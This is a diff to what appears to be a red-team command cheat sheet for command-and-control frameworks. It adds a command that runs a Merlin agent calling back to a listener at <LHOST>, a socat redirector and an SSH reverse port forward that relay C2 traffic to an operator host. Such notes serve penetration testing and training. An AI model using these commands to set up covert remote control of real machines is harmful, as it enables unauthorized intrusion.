@@ -532,6 +532,12 @@ Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» rev2self
 $ make linux URL=http://<>DOMAIN/ HOST=<LHOST> PROTO=http PSK=<PSK>
 ```
 
+#### Simple Test Execution
+
+```c
+$ ./merlinAgent-Linux-x64 -url http://<LHOST>:<LPORT> -psk '<PSK>' -padding 0 -sleep 5s -skew 0 -proto http -v
+```
+
 ### SOCKS Proxy
 
 ```c
@@ -596,6 +602,20 @@ $ cat .env
 
 ```c
 $ socat TCP4-LISTEN:<LPORT>,fork TCP4:<LHOST>:<LPORT>
+```
+
+### Socat + SSH Reverse Port Forwarding
+
+#### Redirector
+
+```c
+$ sudo socat tcp-listen:8443,reuseaddr,fork,bind=<LHOST> tcp:127.0.0.1:1234
+```
+
+#### C2
+
+```c
+$ ssh -N -R 1234:localhost:8443 -i <SSH_KEY> root@<RHOST>
 ```
 
 ## Sliver
